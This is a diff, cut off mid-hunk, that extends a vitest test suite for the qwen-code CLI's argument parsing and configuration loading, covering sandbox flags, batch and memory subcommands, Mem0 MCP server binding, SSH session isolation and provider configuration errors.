@@ -6,9 +6,9 @@
 
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import * as os from 'node:os';
+import * as fs from 'node:fs';
 import * as path from 'node:path';
 import {
-  GOAL_CHECKPOINT_TIMEOUT_SECONDS_CAP,
   GOAL_DEFAULT_TOKEN_BUDGET,
   GOAL_MAX_ACTIVE_MINUTES_CAP,
   GOAL_MAX_TURNS_CAP,
@@ -20,6 +20,7 @@ import {
   AuthType,
   Storage,
   SessionIdCaseConflictError,
+  FatalConfigError,
 } from '@qwen-code/qwen-code-core';
 import { normalizeModelProposedGoals } from './config.js';
 import {
@@ -35,14 +36,58 @@ import type { Settings } from './settings.js';
 import * as ServerConfig from '@qwen-code/qwen-code-core';
 import { isWorkspaceTrusted } from './trustedFolders.js';
 import { resetMcpApprovalsForTesting } from './mcpApprovals.js';
+import { getProjectHooksApprovalState } from './hook-approvals.js';
+import { addCommand } from '../commands/mcp/add.js';
+import * as Mem0Settings from './mem0-settings.js';
+import {
+  isCrossSessionMessagingActive,
+  isCrossSessionMessagingEnabled,
+} from '../peerMessaging/enabled.js';
+
+const sshWorkspaceProbe = vi.hoisted(() => vi.fn());
+vi.mock('./hook-approvals.js', async (importOriginal) => {
+  const actual = await importOriginal<typeof import('./hook-approvals.js')>();
+  const getProjectHooksApprovalState = vi.fn<
+    typeof actual.getProjectHooksApprovalState
+  >(() => undefined);
+  return {
+    ...actual,
+    getProjectHooksApprovalState,
+    applyProjectHooksApproval: (
+      config: Parameters<typeof actual.applyProjectHooksApproval>[0],
+      approval: Parameters<typeof actual.applyProjectHooksApproval>[1],
+    ) => {
+      const state = getProjectHooksApprovalState(approval);
+      config.setProjectHooksPendingApproval(
+        state !== undefined && state !== 'approved',
+        state === 'rejected',
+      );
+      return state;
+    },
+  };
+});
+
+vi.mock('../serve/ssh-workspace-store.js', () => ({
+  readSshWorkspace: sshWorkspaceProbe,
+}));
 
 const mockWriteStderrLine = vi.hoisted(() => vi.fn());
 const mockWriteStdoutLine = vi.hoisted(() => vi.fn());
 const mockUpdateHandler = vi.hoisted(() => vi.fn());
+const mockBatchHandler = vi.hoisted(() => vi.fn());
+const mockMemoryHandler = vi.hoisted(() => vi.fn());
+vi.mock('../commands/memory.js', () => ({
+  memoryCommand: {
+    command: 'memory <subcommand> <source>',
+    builder: { 'dry-run': { type: 'boolean' }, json: { type: 'boolean' } },
+    handler: mockMemoryHandler,
+  },
+}));
 const mockSessionServiceInstance = vi.hoisted(() => ({
   loadLastSession: vi.fn(),
   loadSession: vi.fn(),
   forkSession: vi.fn(),
+  assertLegacySessionExecution: vi.fn(),
   sessionExists: vi.fn(),
   sessionExistsInAnyState: vi.fn(),
   findSessionIdIgnoringCase: vi.fn(),
@@ -63,6 +108,19 @@ vi.mock('../commands/update.js', () => ({
     command: 'update',
     describe: 'mock update command',
     handler: mockUpdateHandler,
+  },
+}));
+
+// The real handler resolves credentials and calls the Batch API, so leaving it
+// unmocked would turn the `batch` exit-list case into a live HTTPS request on
+// any machine with OPENAI_API_KEY + model + base URL set.
+vi.mock('../commands/batch.js', () => ({
+  batchCommand: {
+    // Positionals must be declared: parseArguments runs yargs in strict mode,
+    // so a bare `batch` would reject `status batch_x` before the handler runs.
+    command: 'batch <subcommand> [id]',
+    describe: 'mock batch command',
+    handler: mockBatchHandler,
   },
 }));
 
@@ -101,9 +159,7 @@ const createNativeLspServiceInstance = () => ({
 });
 
 vi.mock('./trustedFolders.js', () => ({
-  isWorkspaceTrusted: vi
-    .fn()
-    .mockReturnValue({ isTrusted: true, source: 'file' }), // Default to trusted
+  isWorkspaceTrusted: vi.fn(() => ({ isTrusted: true, source: 'file' })), // Default to trusted
 }));
 
 const nativeLspServiceMock = vi.mocked(NativeLspService);
@@ -296,11 +352,241 @@ describe('isValidSessionId', () => {
 });
 
 describe('parseArguments', () => {
+  it.each(['on', 'off'] as const)(
+    'accepts explicit workflow mode %s',
+    async (mode) => {
+      process.argv = [
+        'node',
+        'script.js',
+        '--workflow-mode',
+        mode,
+        '-p',
+        'ordinary',
+      ];
+      expect(await parseArguments()).toMatchObject({ workflowMode: mode });
+    },
+  );
+
+  it('preserves an absent workflow mode as undefined', async () => {
+    process.argv = ['node', 'script.js', '-p', 'ordinary'];
+    expect((await parseArguments()).workflowMode).toBeUndefined();
+  });
   const originalArgv = process.argv;
 
   afterEach(() => {
     process.argv = originalArgv;
   });
+
+  it.each([
+    ['--sandbox', 'bwrap'],
+    ['--sandbox=bwrap'],
+    ['-s', 'bwrap'],
+    ['-s=bwrap'],
+  ])(
+    'reports bwrap migration before prompt conflicts: %j',
+    async (...flags) => {
+      process.argv = ['node', 'script.js', ...flags, '-p', 'test prompt'];
+      mockWriteStderrLine.mockClear();
+      await expect(parseArguments()).rejects.toThrow(
+        'Whole-CLI bwrap has been removed',
+      );
+      expect(mockWriteStderrLine).not.toHaveBeenCalled();
+    },
+  );
+
+  it.each(['docker', 'podman', 'sandbox-exec'])(
+    'preserves named sandbox selection %s',
+    async (backend) => {
+      for (const flags of [[`--sandbox=${backend}`], ['-s', backend]]) {
+        process.argv = ['node', 'script.js', ...flags, '-p', 'query'];
+        expect(await parseArguments()).toMatchObject({
+          sandbox: backend,
+          prompt: 'query',
+        });
+      }
+    },
+  );
+
+  it('preserves boolean sandbox flags and literal prompt text', async () => {
+    process.argv = ['node', 'script.js', '--sandbox', '-p', 'bwrap'];
+    expect(await parseArguments()).toMatchObject({
+      sandbox: true,
+      prompt: 'bwrap',
+    });
+    process.argv = ['node', 'script.js', '--no-sandbox', 'query'];
+    expect(await parseArguments()).toMatchObject({
+      sandbox: false,
+      query: 'query',
+    });
+    process.argv = ['node', 'script.js', '--', '--sandbox', 'bwrap'];
+    expect((await parseArguments())._).toEqual(['--sandbox', 'bwrap']);
+  });
+
+  it('keeps the MCP scope alias in its own command grammar', async () => {
+    const handler = vi
+      .spyOn(addCommand, 'handler')
+      .mockImplementation(() => {});
+    process.argv = [
+      'node',
+      'script.js',
+      '--debug',
+      'mcp',
+      'add',
+      '-s',
+      'project',
+      'myserver',
+      'npx',
+      '-y',
+      'foo',
+    ];
+    await expect(parseArguments()).rejects.toThrow(
+      'process.exit unexpectedly called with "0"',
+    );
+    expect(handler).toHaveBeenCalledWith(
+      expect.objectContaining({ scope: 'project', name: 'myserver' }),
+    );
+    handler.mockRestore();
+  });
+
+  it.each([
+    ['--sandbox=docker', 'mcp', 'list'],
+    ['-s', 'docker', 'mcp', 'list'],
+    ['--sandbox=podman', 'extensions', 'list'],
+  ])(
+    'rejects session options on subcommands instead of starting a prompt: %j',
+    async (...args) => {
+      process.argv = ['node', 'script.js', ...args];
+      mockWriteStderrLine.mockClear();
+      await expect(parseArguments()).rejects.toThrow(
+        'process.exit unexpectedly called with "1"',
+      );
+      expect(mockWriteStderrLine).toHaveBeenCalledWith(
+        expect.stringContaining('Unknown argument'),
+      );
+    },
+  );
+
+  it.each([
+    ['--sandbox=true', 'query'],
+    ['--sandbox', '-p', 'query'],
+  ])(
+    'supports explicit automatic selection with a prompt: %j',
+    async (...args) => {
+      process.argv = ['node', 'script.js', ...args];
+      expect(await parseArguments()).toMatchObject({
+        sandbox: true,
+        prompt: 'query',
+      });
+    },
+  );
+
+  it('keeps a positional query separate from explicit automatic sandbox selection', async () => {
+    process.argv = ['node', 'script.js', '--sandbox', 'explain the parser'];
+    expect(await parseArguments()).toMatchObject({
+      sandbox: 'explain the parser',
+    });
+
+    process.argv = [
+      'node',
+      'script.js',
+      '--sandbox=true',
+      'explain the parser',
+    ];
+    expect(await parseArguments()).toMatchObject({
+      sandbox: true,
+      query: 'explain the parser',
+    });
+  });
+
+  it('uses one option grammar and stops parsing options after --', async () => {
+    process.argv = [
+      'node',
+      'script.js',
+      'explain',
+      'what',
+      '-s',
+      'docker',
+      'does',
+    ];
+    expect(await parseArguments()).toMatchObject({
+      sandbox: 'docker',
+      query: 'explain what does',
+    });
+    process.argv = [
+      'node',
+      'script.js',
+      'fix',
+      'the',
+      '--sandbox',
+      'false',
+      'bug',
+    ];
+    expect(await parseArguments()).toMatchObject({
+      sandbox: false,
+      query: 'fix the bug',
+    });
+    process.argv = [
+      'node',
+      'script.js',
+      '--',
+      'explain',
+      'what',
+      '-s',
+      'docker',
+      'does',
+    ];
+    expect((await parseArguments())._).toEqual([
+      'explain',
+      'what',
+      '-s',
+      'docker',
+      'does',
+    ]);
+  });
+
+  it.each(['explain what -s docker does', 'fix the --sandbox false bug'])(
+    'keeps option-like text inside an explicit prompt: %s',
+    async (prompt) => {
+      process.argv = ['node', 'script.js', '--sandbox=true', '-p', prompt];
+      expect(await parseArguments()).toMatchObject({
+        sandbox: true,
+        prompt,
+      });
+    },
+  );
+
+  it('keeps last-wins selection without treating an absent option as false', async () => {
+    for (const flags of [
+      ['--sandbox=docker', '--no-sandbox'],
+      ['--sandbox=true', '--sandbox=false'],
+    ]) {
+      process.argv = ['node', 'script.js', ...flags, '-p', 'query'];
+      expect((await parseArguments()).sandbox).toBe(false);
+    }
+    process.argv = ['node', 'script.js', '-p', 'query'];
+    expect((await parseArguments()).sandbox).toBeUndefined();
+  });
+
+  it.each(['--debug', '--safe-mode'])(
+    'exits after prefixed memory preview: %s',
+    async (flag) => {
+      process.argv = [
+        'node',
+        'script.js',
+        flag,
+        'memory',
+        'import',
+        'codex',
+        '--dry-run',
+        '--json',
+      ];
+      mockMemoryHandler.mockClear();
+      await expect(parseArguments()).rejects.toThrow(
+        'process.exit unexpectedly called with "0"',
+      );
+      expect(mockMemoryHandler).toHaveBeenCalledTimes(1);
+    },
+  );
 
   it('includes every approval mode description in --help', async () => {
     process.argv = ['node', 'script.js', '--help'];
@@ -457,6 +743,30 @@ describe('parseArguments', () => {
     process.argv = ['node', 'script.js', '--insecure'];
     const argv = await parseArguments();
     expect(argv.insecure).toBe(true);
+  });
+
+  it('parses the private ACP execution engine and refuses other engines', async () => {
+    process.argv = [
+      'node',
+      'script.js',
+      '--acp',
+      '--acp-execution-engine',
+      'managed',
+    ];
+    expect((await parseArguments()).acpExecutionEngine).toBe('managed');
+
+    process.argv = [
+      'node',
+      'script.js',
+      '--acp',
+      '--acp-execution-engine',
+      'legacy',
+    ];
+    const mockExit = vi.spyOn(process, 'exit').mockImplementation(() => {
+      throw new Error('process.exit called');
+    });
+    await expect(parseArguments()).rejects.toThrow('process.exit called');
+    mockExit.mockRestore();
   });
 
   it('rejects --json-schema combined with --acp', async () => {
@@ -871,6 +1181,30 @@ describe('parseArguments', () => {
     mockExit.mockRestore();
   });
 
+  it('exits after a `batch` subcommand instead of falling through to the main flow', async () => {
+    // Falling through would reach the memory relaunch, whose child parses argv
+    // again and would submit (and bill) a second batch job.
+    process.argv = ['node', 'script.js', 'batch', 'status', 'batch_x'];
+    mockBatchHandler.mockResolvedValue(undefined);
+
+    const mockExit = vi.spyOn(process, 'exit').mockImplementation(() => {
+      throw new Error('process.exit called');
+    });
+
+    try {
+      await expect(parseArguments()).rejects.toThrow('process.exit called');
+
+      expect(mockBatchHandler).toHaveBeenCalled();
+      expect(mockExit).toHaveBeenCalledWith(0);
+    } finally {
+      mockExit.mockRestore();
+      mockBatchHandler.mockReset();
+      // `run()` in the batch command assigns this before exiting; a leaked 1
+      // would change the exit code of every later test on this worker.
+      process.exitCode = undefined;
+    }
+  });
+
   it('should reject --json-schema with no prompt source when stdin is a TTY', async () => {
     // True interactive invocation with no prompt anywhere → fail fast.
     process.argv = ['node', 'script.js', '--json-schema', '{"type":"object"}'];
@@ -1165,6 +1499,7 @@ describe('parseArguments', () => {
 
 describe('loadCliConfig', () => {
   const originalArgv = process.argv;
+  let originalDebugLogFile: string | undefined;
 
   beforeEach(() => {
     vi.resetAllMocks();
@@ -1187,14 +1522,267 @@ describe('loadCliConfig', () => {
     vi.mocked(os.homedir).mockReturnValue('/mock/home/user');
     vi.stubEnv('GEMINI_API_KEY', 'test-api-key');
     resetMcpApprovalsForTesting();
+    originalDebugLogFile = process.env['QWEN_DEBUG_LOG_FILE'];
   });
 
   afterEach(() => {
     process.argv = originalArgv;
     vi.unstubAllEnvs();
+    // vi.unstubAllEnvs cannot undo the direct `QWEN_DEBUG_LOG_FILE = '1'`
+    // assignment that loadCliConfig makes under --debug; a leaked '1' enables
+    // the debug logger's fire-and-forget writes for the rest of the file,
+    // and they land after the QWEN_HOME pin's afterAll sweep in test-setup.
+    if (originalDebugLogFile === undefined) {
+      delete process.env['QWEN_DEBUG_LOG_FILE'];
+    } else {
+      process.env['QWEN_DEBUG_LOG_FILE'] = originalDebugLogFile;
+    }
     resetMcpApprovalsForTesting();
     vi.restoreAllMocks();
   });
+
+  it('H03 forwards only an explicitly supplied workflow ancestor provider', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    await loadCliConfig({}, argv);
+    expect(
+      mockConfigConstructorParams.mock.lastCall?.[0]
+        .workflowAncestorTrustProvider,
+    ).toBeUndefined();
+    const provider = vi.fn(async (dirs: readonly string[]) =>
+      dirs.map(() => true),
+    );
+    await loadCliConfig(
+      {},
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      { workflowAncestorTrustProvider: provider },
+    );
+    expect(mockConfigConstructorParams.mock.lastCall?.[0]).toHaveProperty(
+      'workflowAncestorTrustProvider',
+      provider,
+    );
+    expect(provider).not.toHaveBeenCalled();
+  });
+
+  it('derives folderTrust from settings and defaults it to false', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    // The interactive project-hook gate reads Config.folderTrust, so a
+    // derivation defaulting it to true would silently arm repo-supplied hooks.
+    await loadCliConfig({}, argv);
+    expect(mockConfigConstructorParams.mock.lastCall?.[0].folderTrust).toBe(
+      false,
+    );
+    await loadCliConfig({ security: { folderTrust: { enabled: true } } }, argv);
+    expect(mockConfigConstructorParams.mock.lastCall?.[0].folderTrust).toBe(
+      true,
+    );
+  });
+
+  it.each(['bare', 'safe', 'ssh', 'agent-host', 'provisional'] as const)(
+    'H03 strips a supplied ancestor provider from %s sessions',
+    async (kind) => {
+      process.argv = [
+        'node',
+        'script.js',
+        ...(kind === 'bare' ? ['--bare'] : []),
+        ...(kind === 'safe' ? ['--safe-mode'] : []),
+      ];
+      if (kind === 'ssh') {
+        sshWorkspaceProbe.mockReturnValueOnce({
+          host: 'host',
+          port: 2222,
+          directory: '/srv/project',
+        });
+      }
+      const provider = vi.fn(async (dirs: readonly string[]) =>
+        dirs.map(() => true),
+      );
+      await loadCliConfig(
+        {},
+        await parseArguments(),
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        {
+          workflowAncestorTrustProvider: provider,
+          ...(kind === 'agent-host'
+            ? { agentHostReadOnly: true as const }
+            : {}),
+          ...(kind === 'provisional'
+            ? { provisionalWorkspace: true as const }
+            : {}),
+        },
+      );
+      expect(
+        mockConfigConstructorParams.mock.lastCall?.[0]
+          .workflowAncestorTrustProvider,
+      ).toBeUndefined();
+      expect(provider).not.toHaveBeenCalled();
+    },
+  );
+
+  it.each([undefined, 'workspace', 'project'] as const)(
+    'registers bundled Mem0 read-only over repository MCP configuration: %s',
+    async (scope) => {
+      const server = {
+        command: process.execPath,
+        args: ['mem0/main.js'],
+        includeTools: ['context_search'],
+      };
+      const createServer = vi
+        .spyOn(Mem0Settings, 'createBundledMem0Server')
+        .mockReturnValue(server);
+      process.argv = ['node', 'script.js', '-p', 'hello'];
+      const argv = await parseArguments();
+      const mem0 = { baseUrl: 'https://mem0.example', enableWrites: true };
+      await loadCliConfig(
+        {
+          memory: { mem0 },
+          ...(scope
+            ? {
+                mcpServers: {
+                  'external-context': { command: 'repo-mcp', scope },
+                },
+              }
+            : {}),
+        },
+        argv,
+      );
+      expect(createServer).toHaveBeenCalledWith(
+        mem0,
+        expect.any(String),
+        false,
+      );
+      expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+        expect.objectContaining({
+          mcpServers: expect.objectContaining({ 'external-context': server }),
+        }),
+      );
+    },
+  );
+
+  it('rejects a manual operator external-context server alongside bundled Mem0', async () => {
+    vi.spyOn(Mem0Settings, 'createBundledMem0Server').mockReturnValue({
+      command: process.execPath,
+      args: ['mem0/main.js'],
+    });
+    process.argv = ['node', 'script.js', '-p', 'hello'];
+    await expect(
+      loadCliConfig(
+        {
+          memory: { mem0: { baseUrl: 'https://mem0.example' } },
+          mcpServers: { 'external-context': { command: 'operator-mcp' } },
+        },
+        await parseArguments(),
+      ),
+    ).rejects.toThrow(
+      'Configure memory.mem0 or an external-context MCP server',
+    );
+  });
+
+  it('does not create a bundled server for an explicitly disabled Mem0', async () => {
+    const createServer = vi.spyOn(Mem0Settings, 'createBundledMem0Server');
+    process.argv = ['node', 'script.js', '-p', 'hello'];
+    await loadCliConfig(
+      { memory: { mem0: null } } as unknown as Settings,
+      await parseArguments(),
+    );
+    expect(createServer).not.toHaveBeenCalled();
+  });
+
+  it('overrides a workspace-scoped external-context server instead of aborting startup', async () => {
+    const server = {
+      command: process.execPath,
+      args: ['mem0/main.js'],
+      includeTools: ['context_search'],
+    };
+    vi.spyOn(Mem0Settings, 'createBundledMem0Server').mockReturnValue(server);
+    process.argv = ['node', 'script.js', '-p', 'hello'];
+    const argv = await parseArguments();
+    // A trusted repository's own `.qwen/settings.json` contributes this entry
+    // stamped `scope: 'workspace'` (settings.ts tagMcpServerScope). It is not
+    // operator configuration, so it must not wedge every operator who set
+    // `memory.mem0` in a folder they cannot fix; the built-in binding overrides
+    // it because assembleMcpServers spreads topTierMcpServers last — the same
+    // thing that already happens to a `.mcp.json` entry of that name.
+    await loadCliConfig(
+      {
+        memory: { mem0: { baseUrl: 'https://mem0.example' } },
+        mcpServers: {
+          'external-context': {
+            command: 'node',
+            args: ['.qwen/shim/loader.js'],
+            scope: 'workspace',
+          },
+        },
+      },
+      argv,
+    );
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({
+        mcpServers: expect.objectContaining({ 'external-context': server }),
+      }),
+    );
+  });
+
+  it('still rejects an operator-scoped external-context server next to memory.mem0', async () => {
+    const server = {
+      command: process.execPath,
+      args: ['mem0/main.js'],
+      includeTools: ['context_search'],
+    };
+    vi.spyOn(Mem0Settings, 'createBundledMem0Server').mockReturnValue(server);
+    process.argv = ['node', 'script.js', '-p', 'hello'];
+    const argv = await parseArguments();
+    // No `scope` = user/default settings, i.e. the operator's own binding: that
+    // conflict stays loud, so dropping the provenance check cannot pass.
+    await expect(
+      loadCliConfig(
+        {
+          memory: { mem0: { baseUrl: 'https://mem0.example' } },
+          mcpServers: {
+            'external-context': { command: 'node', args: ['loader.js'] },
+          },
+        },
+        argv,
+      ),
+    ).rejects.toThrow(
+      'Configure memory.mem0 or an external-context MCP server, not both.',
+    );
+  });
+
+  it.each([undefined, '1'])(
+    'propagates the operator requirement independently of daemon factory availability: %s',
+    async (serve) => {
+      vi.stubEnv('QWEN_AGENT_EXECUTION_BACKEND', 'docker');
+      vi.stubEnv('QWEN_CODE_SERVE', serve);
+      vi.stubEnv('SANDBOX', undefined);
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      await loadCliConfig({}, argv);
+      expect(mockConfigConstructorParams).toHaveBeenCalledWith(
+        expect.objectContaining({
+          agentExecutionBackend: 'container',
+          executionEnvironmentFactory:
+            serve || process.platform === 'win32'
+              ? undefined
+              : expect.any(Function),
+        }),
+      );
+    },
+  );
 
   it('should reset context file names to QWEN.md and AGENTS.md by default', async () => {
     process.argv = ['node', 'script.js'];
@@ -1209,6 +1797,308 @@ describe('loadCliConfig', () => {
       ServerConfig.DEFAULT_CONTEXT_FILENAME,
       ServerConfig.AGENT_CONTEXT_FILENAME,
     ]);
+  });
+
+  it('isolates SSH configuration from local project services and code-mode-only settings', async () => {
+    sshWorkspaceProbe.mockReturnValueOnce({
+      host: 'host',
+      port: 2222,
+      directory: '/srv/project',
+    });
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    await loadCliConfig(
+      {
+        tools: {
+          codeModeOnly: true,
+          truncateToolOutputThreshold: 2500,
+          shell: { defaultTimeoutMs: 45000 },
+        },
+        mcpServers: { local: { command: 'must-not-run' } },
+      },
+      argv,
+    );
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({
+        codeModeOnly: false,
+        disableAllHooks: true,
+        mcpServers: {},
+        overrideExtensions: [],
+        workflowsEnabled: false,
+        enableManagedAutoMemory: false,
+        enableManagedAutoDream: false,
+        enableTeamMemory: false,
+        enableTeamMemorySync: false,
+        enableStructuredMemoryRecall: false,
+        enableAutoSkill: false,
+        fileCheckpointingEnabled: false,
+        artifactEnabled: false,
+        executionEnvironment: expect.objectContaining({
+          toolNames: expect.any(Set),
+        }),
+        appendSystemPrompt: expect.stringContaining('/srv/project'),
+      }),
+    );
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+  });
+
+  it('isolates a host-owned Session connection from same-ID providers, environment and auxiliary models', async () => {
+    process.argv = ['node', 'script.js'];
+    vi.stubEnv('OPENAI_API_KEY', 'ambient-key');
+    vi.stubEnv('OPENAI_BASE_URL', 'https://ambient.example/v1');
+    const argv = await parseArguments();
+    const settings: Settings = {
+      modelProviders: {
+        openai: [
+          {
+            id: 'shared',
+            apiKey: 'catalog-key',
+            baseUrl: 'https://catalog.example/v1',
+          },
+        ],
+      },
+      fastModel: 'ambient-fast',
+      compactionModel: 'ambient-compaction',
+      advisorModel: 'ambient-advisor',
+      modelFallbacks: ['ambient-fallback'],
+    };
+    const modelConfiguration = {
+      authType: AuthType.USE_ANTHROPIC,
+      model: 'shared',
+      apiKey: 'session-key',
+      baseUrl: 'https://session.example/v1',
+      samplingParams: { temperature: 0.4 },
+    };
+    await loadCliConfig(
+      settings,
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      true,
+      { modelConfiguration },
+    );
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({
+        authType: AuthType.USE_ANTHROPIC,
+        generationConfig: expect.objectContaining(modelConfiguration),
+        modelProvidersConfig: {},
+        providerProtocolConfig: {},
+        fastModel: undefined,
+        compactionModel: undefined,
+        advisorModel: undefined,
+        modelFallbacks: [],
+      }),
+    );
+    expect(settings.fastModel).toBe('ambient-fast');
+    expect(settings.modelProviders?.openai?.[0]?.apiKey).toBe('catalog-key');
+    expect(process.env['OPENAI_API_KEY']).toBe('ambient-key');
+  });
+
+  it.each<[string, Record<string, boolean>, number | undefined]>([
+    ['gpt-4o-mini', { image: true }, 131072],
+    ['unknown-session-model', {}, undefined],
+  ])(
+    'derives capabilities for a Session connection using %s without ambient generation settings',
+    async (model, modalities, contextWindowSize) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const modelConfiguration = {
+        authType: AuthType.USE_OPENAI,
+        model,
+        apiKey: 'session-key',
+        baseUrl: 'https://session.example/v1',
+      };
+      await loadCliConfig(
+        {
+          model: {
+            generationConfig: {
+              modalities: { video: true },
+              contextWindowSize: 7,
+              samplingParams: { temperature: 1.9 },
+            },
+            enableOpenAILogging: true,
+            openAILoggingDir: '/tmp/session-model-audit',
+            reasoningEffort: 'high',
+          },
+        },
+        argv,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        true,
+        { modelConfiguration },
+      );
+      const actual =
+        mockConfigConstructorParams.mock.calls.at(-1)?.[0].generationConfig;
+      expect(actual).toMatchObject({
+        ...modelConfiguration,
+        enableOpenAILogging: true,
+        openAILoggingDir: '/tmp/session-model-audit',
+        reasoning: { effort: 'high' },
+      });
+      expect(actual?.modalities).toEqual(modalities);
+      expect(actual?.contextWindowSize).toBe(contextWindowSize);
+      expect(actual?.samplingParams).toBeUndefined();
+    },
+  );
+
+  it('passes the effective model API to Config at startup', async () => {
+    process.argv = ['node', 'script.js'];
+    vi.stubEnv('RESPONSES_KEY', 'responses-key');
+    const argv = await parseArguments();
+    const config = await loadCliConfig(
+      {
+        security: { auth: { selectedType: AuthType.USE_OPENAI } },
+        model: { name: 'gpt-model' },
+        modelProviders: {
+          openai: [
+            {
+              id: 'gpt-model',
+              wireApi: 'responses',
+              envKey: 'RESPONSES_KEY',
+              baseUrl: 'https://example.test/v1',
+            },
+          ],
+        },
+      },
+      argv,
+    );
+
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({
+        authType: AuthType.USE_OPENAI_RESPONSES,
+        generationConfig: expect.objectContaining({
+          authType: AuthType.USE_OPENAI_RESPONSES,
+          apiKey: 'responses-key',
+        }),
+      }),
+    );
+    expect(config.getModelsConfig().getCurrentAuthType()).toBe(
+      AuthType.USE_OPENAI_RESPONSES,
+    );
+  });
+
+  it.each<[Settings, AuthType | undefined]>([
+    [
+      { modelProviders: { 'openai-responses': [{ id: 'old' }] } },
+      AuthType.USE_OPENAI_RESPONSES,
+    ],
+    [{ modelProviders: { 'openai-responses': [] } }, undefined],
+    [
+      {
+        modelProviders: { gateway: [{ id: 'old' }] },
+        providerProtocol: { gateway: 'openai-responses' },
+      },
+      AuthType.USE_OPENAI_RESPONSES,
+    ],
+    [{ providerProtocol: { unused: 'openai-responses' } }, undefined],
+    [
+      {
+        modelProviders: { 'openai-responses': [{ id: 'old' }] },
+        providerProtocol: { 'openai-responses': 'openai' },
+      },
+      AuthType.USE_OPENAI,
+    ],
+  ])(
+    'loads released provider configuration without changing its declared route: %j',
+    async (settings, expectedProtocol) => {
+      process.argv = ['node', 'script.js'];
+      const before = structuredClone(settings);
+      const argv = await parseArguments();
+      const config = await loadCliConfig(settings, argv);
+      for (const authType of [
+        AuthType.USE_OPENAI,
+        AuthType.USE_OPENAI_RESPONSES,
+      ]) {
+        const oldModels = config
+          .getModelsConfig()
+          .getAvailableModelsForAuthType(authType)
+          .filter((model) => model.id === 'old');
+        expect(oldModels).toHaveLength(authType === expectedProtocol ? 1 : 0);
+      }
+      expect(settings).toEqual(before);
+    },
+  );
+
+  it('reports an invalid model api as a config error, not an unexpected crash', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = {
+      security: { auth: { selectedType: AuthType.USE_OPENAI } },
+      model: { name: 'gpt-model' },
+      modelProviders: {
+        openai: [
+          {
+            id: 'gpt-model',
+            // A hand-editable typo. This resolves before the TUI starts, so an
+            // unwrapped throw leaves the user a stack trace and no way back.
+            wireApi: 'resposnes' as 'responses',
+            envKey: 'RESPONSES_KEY',
+          },
+        ],
+      },
+    };
+
+    const err = await loadCliConfig(settings, argv).catch((e: unknown) => e);
+
+    expect(err).toBeInstanceOf(FatalConfigError);
+    expect((err as Error).message).toMatch(
+      /Invalid wireApi "resposnes" for provider "openai"/,
+    );
+  });
+
+  it('reports an invalid model api as a config error even with no model selected', async () => {
+    process.argv = ['node', 'script.js'];
+    // Clear every auth env var getAuthTypeFromEnv can read so no selectedType
+    // is inferred from the runner environment.
+    for (const key of [
+      'QWEN_OAUTH',
+      'OPENAI_API_KEY',
+      'OPENAI_MODEL',
+      'QWEN_MODEL',
+      'OPENAI_BASE_URL',
+      'GEMINI_API_KEY',
+      'GEMINI_MODEL',
+      'GOOGLE_API_KEY',
+      'GOOGLE_MODEL',
+      'GOOGLE_CLOUD_PROJECT',
+      'ANTHROPIC_API_KEY',
+      'ANTHROPIC_MODEL',
+      'ANTHROPIC_BASE_URL',
+    ]) {
+      vi.stubEnv(key, undefined);
+    }
+    const argv = await parseArguments();
+    const settings: Settings = {
+      // No security.auth.selectedType and no model.name: generation-config
+      // resolution never touches the model, so the invalid `wireApi` is caught by
+      // the up-front validation loop in loadCliConfig — still a config error,
+      // not an unexpected crash with a stack trace.
+      modelProviders: {
+        openai: [
+          {
+            id: 'gpt-model',
+            wireApi: 'resposnes' as 'responses',
+            envKey: 'RESPONSES_KEY',
+          },
+        ],
+      },
+    };
+
+    const err = await loadCliConfig(settings, argv).catch((e: unknown) => e);
+    vi.unstubAllEnvs();
+
+    expect(err).toBeInstanceOf(FatalConfigError);
+    expect((err as Error).message).toMatch(
+      /Invalid wireApi "resposnes" for provider "openai"/,
+    );
   });
 
   it('registers the external agent executor factory so executor definitions dispatch (R1-7)', async () => {
@@ -1340,6 +2230,25 @@ describe('loadCliConfig', () => {
     });
   });
 
+  it.each([undefined, false, true])(
+    'passes the model catalog refresh setting to Config: %s',
+    async (catalogRefresh) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+
+      await loadCliConfig(
+        catalogRefresh === undefined ? {} : { model: { catalogRefresh } },
+        argv,
+      );
+
+      expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+        expect.objectContaining({
+          modelCatalogRefreshEnabled: catalogRefresh,
+        }),
+      );
+    },
+  );
+
   describe('model.goalTokenBudget', () => {
     it('carries the setting into the Goal budget grant', async () => {
       process.argv = ['node', 'script.js'];
@@ -1462,41 +2371,23 @@ describe('loadCliConfig', () => {
   });
 
   describe('model.goalCheckpointTimeoutSeconds', () => {
-    it('carries the setting into the checkpoint verifier timeout', async () => {
-      process.argv = ['node', 'script.js'];
-      const argv = await parseArguments();
+    it.each([45, 0, -1, 1.5, 901, '30' as unknown as number])(
+      'loads with the deprecated setting at %s and ignores it',
+      async (value) => {
+        // Goals no longer run evidence checkpoints, so nothing reads the
+        // value. A settings file that still carries it, valid or not, must
+        // not stop the CLI from starting.
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
 
-      const config = await loadCliConfig(
-        { model: { goalCheckpointTimeoutSeconds: 45 } },
-        argv,
-      );
-
